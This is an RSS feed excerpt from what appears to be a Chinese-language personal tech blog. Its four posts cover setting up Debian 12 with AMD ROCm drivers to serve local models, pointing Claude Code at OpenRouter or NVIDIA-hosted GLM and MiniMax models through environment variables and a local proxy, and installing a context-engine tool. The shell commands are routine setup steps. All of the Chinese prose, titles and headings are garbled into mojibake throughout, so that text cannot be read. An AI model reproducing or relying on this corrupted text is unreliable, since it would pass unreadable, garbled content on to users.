<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>æ‰€æœ‰æ–‡ç«  on å…«æˆ’çš„æŠ€æœ¯åšå®¢</title>
    <link>https://rendoumi.com/posts/</link>
    <description>Recent content in æ‰€æœ‰æ–‡ç«  on å…«æˆ’çš„æŠ€æœ¯åšå®¢</description>
    <image>
      <title>å…«æˆ’çš„æŠ€æœ¯åšå®¢</title>
      <url>https://rendoumi.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://rendoumi.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- 0.147.3</generator>
    <language>zh</language>
    <copyright>Copyright Â© 2020-2025 Zhang Ranrui. All Rights Reserved.</copyright>
    <lastBuildDate>Tue, 03 Feb 2026 09:00:01 +0800</lastBuildDate>
    <atom:link href="https://rendoumi.com/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Claude Codeå¦‚ä½•ä½¿ç”¨ollamaæä¾›çš„qwen3:2.5Bå¤§æ¨¡å‹æ¥ç§ç½‘ä½¿ç”¨</title>
      <link>https://rendoumi.com/posts/20260203-cluadecode_qwen2.5b/</link>
      <pubDate>Tue, 03 Feb 2026 09:00:01 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20260203-cluadecode_qwen2.5b/</guid>
      <description>&lt;p&gt;Cluade codeã€Codexã€Geminiä¸‰æ¶é©¬è½¦æ˜¯é½å¤´å¹¶è¿›çš„åŠ¿å¤´ï¼Œé‚£å°†æ¥å¿…å®šæ˜¯Farmå†œåœºå’ŒTokenæˆ˜äº‰çš„å¹´ä»£ã€‚&lt;/p&gt;
&lt;p&gt;é‚£æˆ‘ä»¬å¿…é¡»å‡†å¤‡å¥½ï¼Œè‡ªå·±åœ¨å±€åŸŸç½‘éƒ¨ç½²å¤§æ¨¡å‹ï¼Œä¸ä¾èµ–äºä»»ä½•çš„æä¾›å‚å®¶ã€‚&lt;/p&gt;
&lt;p&gt;æœ¬ç¯‡å°±æ˜¯ä»å…‰æ†çš„debian 12å¼€å§‹ï¼Œæ­é…AMD 6700 xt 12Gçš„æ˜¾å¡ï¼Œä»å¤´æ­å»ºä¸€ä¸ªå¤§æ¨¡å‹æœåŠ¡å™¨ï¼Œä¾›å±€åŸŸç½‘çš„åŒäº‹ä»¬ä½¿ç”¨&lt;/p&gt;
&lt;h3 id=&#34;ä¸€debianå®‰è£…&#34;&gt;ä¸€ã€Debianå®‰è£…&lt;/h3&gt;
&lt;p&gt;å…‰æ†debian isoä¸‹è½½&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://gemmei.ftp.acc.umu.se/cdimage/archive/12.0.0/amd64/iso-cd/debian-12.0.0-amd64-netinst.iso
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç”¨rufusåˆ»å½•åˆ°Uç›˜ï¼Œç„¶åå®‰è£…&lt;/p&gt;
&lt;p&gt;rootç”¨æˆ·ï¼Œç„¶åå»ºç«‹ä¸€ä¸ªæ™®é€šç”¨æˆ·debian&lt;/p&gt;
&lt;h3 id=&#34;äºŒdebianå‡†å¤‡é©±åŠ¨&#34;&gt;äºŒã€Debianå‡†å¤‡é©±åŠ¨&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# root ç”¨æˆ·&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt update &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt upgrade -y
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt install sudo
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# debianç”¨æˆ·&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install -y wget gnupg2 curl software-properties-common linux-headers-&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;uname -r&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget -qO - https://repo.radeon.com/rocm/rocm.gpg.key &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sudo gpg --dearmor -o /etc/apt/keyrings/rocm.gpg
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/rocm.gpg] https://repo.radeon.com/amdgpu/6.0/ubuntu jammy main&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sudo tee /etc/apt/sources.list.d/amdgpu.list
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/rocm.gpg] https://repo.radeon.com/rocm/apt/6.0 jammy main&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sudo tee /etc/apt/sources.list.d/rocm.list
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt update
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install -y amdgpu-dkms rocm-hip-libraries
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo tee /etc/apt/preferences.d/rocm-pin-600 &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt;EOF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Package: *
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Pin: origin repo.radeon.com
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Pin-Priority: 600
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt update
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install -y amdgpu-dkms rocm-hip-libraries
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo usermod -aG video,render &lt;span class=&#34;nv&#34;&gt;$USER&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo reboot
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå°±å®‰è£…å¥½äº†æ˜¾å¡é©±åŠ¨ï¼Œè§£é‡Šä¸€ä¸‹ï¼Œå¿…é¡»è®©æ–°repoçš„ä¼˜å…ˆçº§æé«˜ï¼Œæ‰èƒ½å®‰è£…ï¼ç¡®è®¤ä¸€ä¸‹ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>Claude Codeå¦‚ä½•ä½¿ç”¨openrouteræä¾›çš„å¤§æ¨¡å‹æ¥èŠ‚çœè´¹ç”¨</title>
      <link>https://rendoumi.com/posts/20260203-claudecode_openrouter/</link>
      <pubDate>Tue, 03 Feb 2026 09:00:00 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20260203-claudecode_openrouter/</guid>
      <description>&lt;p&gt;Cluade codeã€Codexã€Geminiä¸‰æ¶é©¬è½¦æ˜¯é½å¤´å¹¶è¿›çš„åŠ¿å¤´ï¼Œé‚£å°†æ¥å¿…å®šæ˜¯Farmå†œåœºå’ŒTokenæˆ˜äº‰çš„å¹´ä»£ã€‚&lt;/p&gt;
&lt;p&gt;é‚£èŠ‚çœæˆæœ¬çš„æ–¹æ³•æ˜¯å°½é‡ä½¿ç”¨åˆé€‚çš„æ¨¡å‹æ¥åšåˆé€‚çš„äº‹æƒ…&lt;/p&gt;
&lt;p&gt;é‚£å¦‚æœæœ‰openrouterçš„API KEYï¼Œå¦‚ä½•æ¥å…¥Claude codeè¿›è¡Œä½¿ç”¨å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;openrouteråŸºæœ¬æä¾›äº†500ä¸ªAI modelsï¼Œä»ä¸­é€‰æ‹©åˆé€‚çš„æ¨¡å‹å°±å¯ä»¥æå¤§çš„é™ä½è´¹ç”¨&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260203092128937&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260203-claudecode_openrouter/image-20260203092128937.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‚£Claude Codeä½¿ç”¨çš„ä¸‰ä¸ªæ¨¡å‹&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Opus &amp;ndash; &lt;strong&gt;å¤æ‚æ¨ç†ä»»åŠ¡&lt;/strong&gt;ï¼ˆé€‚åˆæ¶æ„è®¾è®¡ã€è§£å†³æ£˜æ‰‹ Bugï¼‰&lt;/li&gt;
&lt;li&gt;Sonnet &amp;ndash; &lt;strong&gt;æ—¥å¸¸æ ‡å‡†ä»»åŠ¡&lt;/strong&gt;ï¼ˆé€‚åˆç»å¤§å¤šæ•°ç¼–ç¨‹/å†™ä»£ç å·¥ä½œï¼‰&lt;/li&gt;
&lt;li&gt;Haiku &amp;ndash; &lt;strong&gt;å¿«é€Ÿã€ä½æˆæœ¬ä»»åŠ¡&lt;/strong&gt;ï¼ˆé€‚åˆæ¢ç´¢æ€§å·¥ä½œã€æŸ¥é˜…æ–‡æ¡£ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æˆ‘ä»¬åˆ†åˆ«ç”¨ Gemini Flashã€DeepSeek Coderæ¥æ›¿ä»£ï¼Œæœ€åç”¨Sonnetæ¥è¡¥å…¨å‰©ä½™éƒ¨åˆ†ï¼Œå°±çœé’±å¤šäº†&lt;/p&gt;
&lt;p&gt;æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h4 id=&#34;ä¸€genå‡ºopenrouteçš„api-key&#34;&gt;ä¸€ã€genå‡ºOpenRouteçš„API Key&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;è®¿é—® &lt;a href=&#34;https://openrouter.ai/&#34;&gt;OpenRouter&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;æ³¨å†Œç™»å½• (æœ‰ $1 çš„å…è´¹é¢åº¦)&lt;/li&gt;
&lt;li&gt;è®¿é—® &lt;a href=&#34;https://openrouter.ai/keys&#34;&gt;API Keys&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;ç‚¹å‡» â€œCreate Keyâ€&lt;/li&gt;
&lt;li&gt;æŠŠkeyå¤åˆ¶ä¸‹æ¥ (ç±»ä¼¼ &lt;code&gt;sk-or-v1-...&lt;/code&gt;)&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;äºŒå®‰è£…é…ç½®è–…claude-code&#34;&gt;äºŒã€å®‰è£…é…ç½®è–…Claude Code&lt;/h4&gt;
&lt;p&gt;è¿™ä¸ªä¹Ÿä¸å¤šè¯´äº†&lt;/p&gt;
&lt;h4 id=&#34;ä¸‰é…ç½®è¿æ¥claude-codeçš„è¿æ¥&#34;&gt;ä¸‰ã€é…ç½®è¿æ¥Claude Codeçš„è¿æ¥&lt;/h4&gt;
&lt;p&gt;ä¸»è¦æ˜¯å‡ ä¸ªå˜é‡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;OPENROUTER_API_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;sk-or-v1-your-actual-key-here&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ANTHROPIC_BASE_URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;https://openrouter.ai/api&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ANTHROPIC_AUTH_TOKEN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$OPENROUTER_API_KEY&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ANTHROPIC_API_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;éªŒè¯ä¸€ä¸‹ï¼Œå¯åŠ¨claudeï¼Œè¾“å…¥ /status&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260203093938347&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260203-claudecode_openrouter/image-20260203093938347.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;çœ‹åˆ°å°±okäº†&lt;/p&gt;
&lt;h4 id=&#34;å››cluaudeå·¥å…·é“¾è°ƒç”¨çš„æ¨¡å‹é€‰æ‹©&#34;&gt;å››ã€Cluaudeå·¥å…·é“¾è°ƒç”¨çš„æ¨¡å‹é€‰æ‹©&lt;/h4&gt;
&lt;p&gt;Claude Codeéœ€è¦æ¨¡å‹èƒ½æ”¯æŒ&amp;quot;tool use&amp;quot;(ä¹Ÿå«åšå‡½æ•°è°ƒç”¨)ï¼Œè¿™äº›å…è®¸Claude codeåšå¦‚ä¸‹äº‹æƒ…&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;*&lt;strong&gt;Read and edit files*&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;*&lt;strong&gt;Run terminal commands*&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;*&lt;strong&gt;Search your codebase*&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;*&lt;strong&gt;Execute git commands*&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;æ”¯æŒå·¥å…·é“¾è°ƒç”¨çš„æ¨¡å‹:&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>é»„å¤§å–„äººå…è´¹çš„çš„nvidia glmå’Œminimaxæ¨¡å‹åº”ç”¨äºClaude Code</title>
      <link>https://rendoumi.com/posts/20260120-nvidia_claudecode/</link>
      <pubDate>Tue, 20 Jan 2026 09:00:00 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20260120-nvidia_claudecode/</guid>
      <description>&lt;p&gt;é»„å¤§å–„äººçš„Nvidiaé‡Œé¢æœ‰å¾ˆå¤šå…è´¹çš„æ¨¡å‹ï¼ŒåŒ…æ‹¬zai/glm4.7å’Œminimaxai/minimax-m2.1&lt;/p&gt;
&lt;p&gt;é‚£æ²¡æœ‰è®¢é˜…çš„åŒå­¦ä»¬å¯ä»¥æ‹¿æ¥ç›´æ¥ç”¨åˆ°Cluade codeä¸­&lt;/p&gt;
&lt;p&gt;æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h3 id=&#34;ä¸€ä»å®˜ç½‘è¿›è¡Œè·å–api-key&#34;&gt;ä¸€ã€ä»å®˜ç½‘è¿›è¡Œè·å–api-key&lt;/h3&gt;
&lt;p&gt;èµ·æ‰‹å…ˆæ³¨å†Œè´¦æˆ·æ‹¿Key&lt;/p&gt;
&lt;p&gt;åœ°å€ï¼šhttps://build.nvidia.com/explore/discover&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260120112209005&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260120-nvidia_claudecode/image-20260120112209005.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260120112343106&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260120-nvidia_claudecode/image-20260120112343106.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ–è€…&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260120112301489&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260120-nvidia_claudecode/image-20260120112301489.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;äºŒå¦‚ä½•ä½¿ç”¨&#34;&gt;äºŒã€å¦‚ä½•ä½¿ç”¨&lt;/h3&gt;
&lt;p&gt;ç„¶åä¸»è¦æ˜¯æˆ‘ä¸ç”¨ccrï¼ŒCLIProxyAPIä¹Ÿå¼€å…¨å±€ä»£ç†äº†ï¼Œä¹Ÿæ— æ³•ç”¨ï¼Œæ‰€ä»¥å¹²è„†æ“ä¸ªå¥½äº†
ç”¨ccrå’ŒCLIProxyAPIå°±å¯ä»¥ç›´æ¥ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;æºä»£ç ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://github.com/zhangrr/claude-nvidia-proxy
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;é…ç½®æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;nvidia_url&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://integrate.api.nvidia.com/v1/chat/completions&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;nvidia_key&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;nvapi-api-key&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç›´æ¥è¿è¡Œç¨‹åºï¼Œä¼šç›‘å¬æœ¬åœ°ç«¯å£3001&lt;/p&gt;
&lt;p&gt;glm 4.7çš„é…æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ANTHROPIC_BASE_URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://localhost:3001
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ANTHROPIC_AUTH_TOKEN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;nvapi-api-key
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ANTHROPIC_DEFAULT_HAIKU_MODEL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;z-ai/glm4.7
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ANTHROPIC_DEFAULT_SONNET_MODEL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;z-ai/glm4.7
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ANTHROPIC_DEFAULT_OPUS_MODEL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;z-ai/glm4.7
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;claude
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;minimax 2.1 çš„é…æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ANTHROPIC_BASE_URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;http://localhost:3001
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ANTHROPIC_AUTH_TOKEN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;nvapi-api-key
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ANTHROPIC_DEFAULT_HAIKU_MODEL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;minimaxai/minimax-m2.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ANTHROPIC_DEFAULT_SONNET_MODEL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;minimaxai/minimax-m2.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ANTHROPIC_DEFAULT_OPUS_MODEL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;minimaxai/minimax-m2.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;claude
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20260120112903833&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260120-nvidia_claudecode/image-20260120112903833.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>é€‚ç”¨äºclaude codeå’Œcodexçš„è½»é‡çº§AIä¸Šä¸‹æ–‡å¼•æ“åŠ ä¸ŠPromptå¢å¼º</title>
      <link>https://rendoumi.com/posts/20260115-clauce_ace_tool/</link>
      <pubDate>Thu, 15 Jan 2026 09:00:00 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20260115-clauce_ace_tool/</guid>
      <description>&lt;p&gt;é‚£ç¼ºçœçš„claude code å’Œ codex éƒ½å¾ˆå¥½ç”¨ï¼Œä¸Šä¸‹æ–‡æœç´¢ç”¨rigrepä¹Ÿç®—å¯ä»¥ï¼Œé‚£æœ‰æ›´å‰å®³çš„Augmentå¼•æ“ï¼Œèƒ½å‹ç¼©ä¸Šä¸‹æ–‡&lt;/p&gt;
&lt;p&gt;è¯•ä¸€è¯•ï¼Œé¦–å…ˆå»ä½¬å‹çš„ç½‘ç«™ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://acemcp.heroman.wtf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨å†Œå¹¶ç”³è¯·å¥½API Key&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260115095940639&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260115-clauce_ace_tool/image-20260115095940639.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå®‰è£…è¿™ä¸ªace-tool-rsæˆ–è€…ace-tool&lt;/p&gt;
